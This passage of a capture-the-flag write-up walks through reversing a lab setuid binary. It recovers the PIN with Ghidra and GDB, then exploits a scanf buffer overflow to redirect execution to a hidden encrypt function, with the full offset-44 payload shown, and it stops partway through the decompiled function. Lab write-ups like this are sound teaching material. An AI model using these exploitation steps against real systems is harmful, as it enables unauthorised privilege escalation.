/opt/file_encrypt/file_encrypt: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3ae0f5750a8f1ac38945f813b5e34ddc166daf57, not stripped  
tester@overflow:~$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: 1
Wrong Pin
</code></pre></div><p>There is more related information inside <code>/opt/file_encrypt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ ls -la /opt/file_encrypt/
total 24
drwxr-x---+ 2 root root  4096 Sep 17 21:56 <span class="code-blue">.</span>
drwxr-xr-x  3 root root  4096 Sep 17 21:56 <span class="code-blue">..</span>
-rwsr-xr-x  1 root root 11904 May 31  2021 <span class="code-white code-bg-red">file_encrypt</span>  
-rw-r--r--  1 root root   399 May 30  2021 README.md
tester@overflow:~$ cat /opt/file_encrypt/README.md
Our couple of reports have been leaked to avoid this.
We have created a tool to encrypt your reports.
Please check the pin feature of this application and
report any issue that you get as this application is
still in development. We have modified the tool a
little bit that you can only use the pin feature now.
The encrypt function is there but you can't use it now.
The PIN should be in your inbox
</code></pre></div><p>The binary is made to encrypt files, but the function that actually encrypts is not called in the main program. However, the code of that function is still compiled.</p><p>To analyze the binary, let&rsquo;s transfer it to our machine:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ which python3
/usr/bin/python3
tester@overflow:~$ cd /opt/file_encrypt
tester@overflow:~$ python3 -m http.server 1234
Serving HTTP on :: port 1234 (http://[::]:1234/) ...
10.10.17.44 - - [] "GET /file_encrypt HTTP/1.1" 200 -  
^C
Keyboard interrupt received, exiting.
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.119:1234/file_encrypt -so file_encrypt  
</code></pre></div><p>Now we can use Ghidra as a reversing tool to decompile the binary and view the C source code.</p><p>This is the <code>main</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk8">check_pin</span><span class="mtk1">();</span>  
  <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>It calls <code>check_pin</code>, which is this one:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">check_pin</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">local_2c[</span><span class="mtk6">20</span><span class="mtk1">];</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">local_18;</span>
  <span class="mtk7 mtki">long</span> <span class="mtk1">local_14;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">local_10;</span>

  <span class="mtk1">local_10</span> <span class="mtk5">=</span> <span class="mtk8">rand</span><span class="mtk1">();</span>
  <span class="mtk1">local_14</span> <span class="mtk5">=</span> <span class="mtk8">random</span><span class="mtk1">();</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"This</span> <span class="mtk4">is</span> <span class="mtk4">the</span> <span class="mtk4">code</span> <span class="mtk6">%i</span><span class="mtk4">.</span> <span class="mtk4">Enter</span> <span class="mtk4">the</span> <span class="mtk4">Pin:</span> <span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">local_10);</span>
  <span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%i</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_18);</span>
  <span class="mtk5">if</span> <span class="mtk1">(local_14</span> <span class="mtk5">==</span> <span class="mtk1">local_18)</span> <span class="mtk1">{</span>
    <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"name:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
    <span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">local_2c);</span>
    <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Thanks</span> <span class="mtk4">for</span> <span class="mtk4">checking.</span> <span class="mtk4">You</span> <span class="mtk4">can</span> <span class="mtk4">give</span> <span class="mtk4">your</span> <span class="mtk4">feedback</span> <span class="mtk4">for</span> <span class="mtk4">improvements</span> <span class="mtk4">at</span> <span class="mtk4">developer@overflow.htb"</span><span class="mtk1">);</span>  
  <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
    <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Wrong</span> <span class="mtk4">Pin"</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>
  <span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>The code stored in <code>local_10</code> is always the same: <code>1804289383</code>. The program is comparing the value stored in <code>local_14</code> with the PIN provided from user input.</p><p>The number inside of variable <code>local_14</code> is the result of the function called <code>random</code>, which is this one:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">long</span> <span class="mtk8">random</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">uint</span> <span class="mtk1">in_stack_00000004;</span>
  <span class="mtk7 mtki">uint</span> <span class="mtk1">local_c;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">local_8;</span>

  <span class="mtk1">local_c</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">6b8b4567</span><span class="mtk1">;</span>
  <span class="mtk5">for</span> <span class="mtk1">(local_8</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span> <span class="mtk1">local_8</span> <span class="mtk5">&lt;</span> <span class="mtk6">10</span><span class="mtk1">;</span> <span class="mtk1">local_8</span> <span class="mtk5">=</span> <span class="mtk1">local_8</span> <span class="mtk5">+</span> <span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>  
    <span class="mtk1">local_c</span> <span class="mtk5">=</span> <span class="mtk1">local_c</span> <span class="mtk5">*</span> <span class="mtk5">0x</span><span class="mtk6">59</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">;</span>
  <span class="mtk1">}</span>
  <span class="mtk5">return</span> <span class="mtk1">local_c</span> <span class="mtk5">^</span> <span class="mtk1">in_stack_00000004;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Although Ghidra does not show the value of the variable <code>in_stack_00000004</code>, we can guess that it is <code>0x6b8b4567</code>. So we can get what is the expected PIN. For example, in Python it will be:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; local_c = 0x6b8b4567
&gt;&gt;&gt; for _ in range(10):
...     local_c = local_c * 0x59 + 0x14
...
&gt;&gt;&gt; print(local_c ^ 0x6b8b4567)  
56260846220404243151385449272
</code></pre></div><p>However, if we enter this PIN, it is wrong:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./file_encrypt</span>
This is the code 1804289383. Enter the Pin: 56260846220404243151385449272  
Wrong Pin
</code></pre></div><p>Here we must notice that:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%i</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_18);</span>  
</code></pre></div><p>It is reading an integer (not a long integer), so it must be truncated to 32 bits:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; print((local_c ^ 0x6b8b4567) & 0xffffffff)  
4091990840
</code></pre></div><p>But it is still wrong:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./file_encrypt</span>
This is the code 1804289383. Enter the Pin: 4091990840  
Wrong Pin
</code></pre></div><p>At this point, we can use GDB to debug the program and view the expected value.</p><p>First, we must put a breakpoint in the comparison instruction (<code>cmp</code> in assembly):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q file_encrypt
Reading symbols from <span class="code-dark-green">file_encrypt</span>...
(No debugging symbols found in <span class="code-dark-green">file_encrypt</span>)
<span class="code-red">gef‚û§</span>  run
Starting program: ./file_encrypt
This is the code 1804289383. Enter the Pin: ^C  
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0xf7fcf549</span> in <span class="code-dark-yellow">__kernel_vsyscall</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§</span>  disassemble check_pin
Dump of assembler code for function check_pin:
   ...
   <span class="code-dark-blue">0x56555afd</span> &lt;+77&gt;:    push   eax
   <span class="code-dark-blue">0x56555afe</span> &lt;+78&gt;:    call   <span class="code-dark-blue">0x565556c0</span> &lt;<span class="code-dark-yellow">__isoc99_scanf@plt</span>&gt;  
   <span class="code-dark-blue">0x56555b03</span> &lt;+83&gt;:    add    esp,0x10
   <span class="code-dark-blue">0x56555b06</span> &lt;+86&gt;:    mov    eax,DWORD PTR [ebp-0x14]
   <span class="code-dark-blue">0x56555b09</span> &lt;+89&gt;:    cmp    DWORD PTR [ebp-0x10],eax
   <span class="code-dark-blue">0x56555b0c</span> &lt;+92&gt;:    jne    <span class="code-dark-blue">0x56555b4a</span> &lt;<span class="code-dark-yellow">check_pin</span>+154&gt;
   ...
End of assembler dump.
<span class="code-green">gef‚û§</span>  break *0x56555b09
Breakpoint 1 at <span class="code-dark-blue">0x56555b09</span>
</code></pre></div><p>Now we continue the program, enter a random PIN and read the value at <code>$ebp-0x10</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§</span>  continue
Continuing.
1

Breakpoint 1, <span class="code-dark-blue">0x56555b09</span> in <span class="code-dark-yellow">check_pin</span> ()  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§</span>  x $ebp-0x10
<span class="code-dark-blue">0xffffd078</span>:     0xf3e6d338  
</code></pre></div><p>It contains value <code>0xf3e6d338</code>, which is <code>4091990840</code> in decimal. This is weird, since this is the value we tested before.</p><p>The trick here is that the value starts with <code>0xf</code>, which means that the most significant bit is <code>1</code>. If this happens, then the number must be negative. In order to compute the negative value, we must compute the two&rsquo;s complement of <code>0xf3e6d338</code>, which is:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; (~0xf3e6d338 & 0xffffffff) + 1  
202976456
</code></pre></div><p>Another way of finding this value is with GDB, expressing the value as integer (format <code>d</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§</span>  p/d 0xf3e6d338  
$1 = -202976456
</code></pre></div><p>Now we can try with <code>-202976456</code>, and it works:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456  
name:
</code></pre></div><h2 id="exploiting-a-buffer-overflow">Exploiting a Buffer Overflow</h2><p>Let&rsquo;s review what the <code>check_pin</code> function does when the PIN is correct:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">check_pin</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">local_2c[</span><span class="mtk6">20</span><span class="mtk1">];</span>
  <span class="mtk3">//</span> <span class="mtk3">...</span>

  <span class="mtk5">if</span> <span class="mtk1">(local_14</span> <span class="mtk5">==</span> <span class="mtk1">local_18)</span> <span class="mtk1">{</span>
      <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"name:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
      <span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">local_2c);</span>
      <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Thanks</span> <span class="mtk4">for</span> <span class="mtk4">checking.</span> <span class="mtk4">You</span> <span class="mtk4">can</span> <span class="mtk4">give</span> <span class="mtk4">your</span> <span class="mtk4">feedback</span> <span class="mtk4">for</span> <span class="mtk4">improvements</span> <span class="mtk4">at</span> <span class="mtk4">developer@overflow.htb"</span><span class="mtk1">);</span>  
  <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
    <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Wrong</span> <span class="mtk4">Pin"</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>
  <span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>The problem here is that it is reading a string using <code>scanf</code> (<code>__isoc99_scanf</code>) and a format <code>%s</code>. This is vulnerable to Buffer Overflow because <code>local_2c</code> is assigned 20 bytes and <code>scanf</code> allows any string (<code>%s</code>) with any length. Let&rsquo;s test it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  
Segmentation fault (core dumped)
</code></pre></div><p>It seems that we need to exploit the Buffer Overflow vulnerability. But first, we must check if the binary has any protection enabled:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§</span>  checksec
<span class="code-blue">[+]</span> checksec for './file_encrypt'
Canary                        : <span class="code-red">‚úò</span>
NX                            : <span class="code-green">‚úì</span>
PIE                           : <span class="code-green">‚úì</span>
Fortify                       : <span class="code-red">‚úò</span>
RelRO                         : <span class="code-dark-green">Full</span>  
</code></pre></div><p>It has NX enabled (so the stack is not executable) and also PIE enabled (which means that the binary addresses will be randomized if ASLR is enabled). Before going deeper, let&rsquo;s check if ASLR is enabled:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ cat /proc/sys/kernel/randomize_va_space  
0
</code></pre></div><p>And it is disabled, so PIE does nothing. If there was a <code>2</code>, then ASLR would be enabled.</p><p>With a Buffer Overflow we can take control over <code>$eip</code>, that is the Extended Instruction Pointer register. This register contains the address of the next instruction to be executed. In fact, the program crashed because we overwrote <code>$eip</code> with <code>0x41414141</code> (<code>AAAA</code>), which is an invalid address of memory.</p><p>Now that we know that ASLR is disabled, we can disable it in our attacker machine to debug the program in GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">echo</span> 0 | <span class="code-dark-green">tee</span> /proc/sys/kernel/randomize_va_space  
0
</code></pre></div><p>To exploit a Buffer Overflow, we must compute the number of characters needed to overwrite the return address, in order to put an exact value there. To do so, we can use a pattern:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q file_encrypt</span>
Reading symbols from <span class="code-dark-green">file_encrypt</span>...
(No debugging symbols found in <span class="code-dark-green">file_encrypt</span>)
<span class="code-red">gef‚û§</span>  pattern create 60
<span class="code-blue">[+]</span> Generating a pattern of 60 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
<span class="code-green">[+]</span> Saved as '$_gef0'
<span class="code-red">gef‚û§</span>  run
Starting program: ./file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  

Program received signal SIGSEGV, Segmentation fault.
<span class="code-dark-blue">0x6161616c</span> in <span class="code-dark-yellow">??</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§</span>  pattern offset $eip
<span class="code-blue">[+]</span> Searching for '$eip'
<span class="code-green">[+]</span> Found at offset 44 (little-endian search) <span class="code-red">likely</span>  
<span class="code-green">[+]</span> Found at offset 41 (big-endian search)
</code></pre></div><p>And we see that the offset is 44, so we need 44 characters to overwrite the return address. Let&rsquo;s test it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§</span>  run
Starting program: ./file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  

Program received signal SIGSEGV, Segmentation fault.
<span class="code-dark-blue">0x45444342</span> in <span class="code-dark-yellow">??</span> ()
</code></pre></div><p>And it shows that the next instruction is in address <code>0x45444342</code> (<code>BCDE</code> in little-endian), so we have control over <code>$eip</code>.</p><p>In Ghidra, we can find the code for the <code>encrypt</code> function, so it must have an address. Recall that ASLR is disabled and PIE has no effect, then the address of <code>encrypt</code> is static:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§</span>  x encrypt
<span class="code-dark-blue">0x5655585b</span> &lt;<span class="code-dark-yellow">encrypt</span>&gt;:   0x53e58955  
</code></pre></div><p>And the address of <code>encrypt</code> is <code>0x5655585b</code>. Curiously, these bytes are printable. In little-endian format, the address of <code>encrypt</code> is the same as <code>[XUV</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; '\x5b\x58\x55\x56'  
'[XUV'
</code></pre></div><p>So, we can put this address into <code>$eip</code> so that we call <code>encrypt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  
Enter Input File:
</code></pre></div><p>At this point we have exploited the Buffer Overflow to call a function that was not in the main process.</p><h2 id="privilege-escalation">Privilege escalation</h2><p>Let&rsquo;s view the source code for <code>encrypt</code> in Ghidra:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">encrypt</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk9 mtki">__block</span><span class="mtk1">,</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">__edflag</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar1;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">piVar2;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">pcVar3;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_98</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_94</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_90</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_8c</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_88</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_84</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_80</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_7c</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_78</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_74</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">stat</span> <span class="mtk1">local_70;</span>
  <span class="mtk7 mtki">uint</span> <span class="mtk1">local_18;</span>
  <span class="mtk1">FILE</span> <span class="mtk5">*</span><span class="mtk1">local_14;</span>
  <span class="mtk1">FILE</span> <span class="mtk5">*</span><span class="mtk1">local_10;</span>
<span></span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Enter</span> <span class="mtk4">Input</span> <span class="mtk4">File:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
  <span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_84);</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Enter</span> <span class="mtk4">Encrypted</span> <span class="mtk4">File:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
  <span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_98);</span>
  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">stat</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">local_84,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_70);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar2</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar3</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar2);</span>
    <span class="mtk8">fprintf</span><span class="mtk1">(stderr,</span> <span class="mtk4">"Failed</span> <span class="mtk4">to</span> <span class="mtk4">stat</span> <span class="mtk6">%s</span><span class="mtk4">:</span> <span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_84,</span> <span class="mtk1">pcVar3);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>
  <span class="mtk5">if</span> <span class="mtk1">(local_70.st_uid</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">fprintf</span><span class="mtk1">(stderr,</span> <span class="mtk4">"File</span> <span class="mtk6">%s</span> <span class="mtk4">is</span> <span class="mtk4">owned</span> <span class="mtk4">by</span> <span class="mtk4">root</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_84);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>
  <span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">);</span>
  <span class="mtk1">local_10</span> <span class="mtk5">=</span> <span class="mtk8">fopen</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">local_84,</span> <span class="mtk4">"rb"</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(local_10</span> <span class="mtk5">==</span> <span class="mtk1">(FILE</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar2</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar3</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar2);</span>
    <span class="mtk8">fprintf</span><span class="mtk1">((FILE</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk4">"cannot</span> <span class="mtk4">open</span> <span class="mtk4">input</span> <span class="mtk4">file</span> <span class="mtk6">%s</span><span class="mtk4">:</span> <span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">local_84,</span> <span class="mtk1">pcVar3);</span>
  <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
    <span class="mtk1">local_14</span> <span class="mtk5">=</span> <span class="mtk8">fopen</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">local_98,</span> <span class="mtk4">"wb"</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(local_14</span> <span class="mtk5">==</span> <span class="mtk1">(FILE</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
      <span class="mtk1">piVar2</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
      <span class="mtk1">pcVar3</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar2);</span>
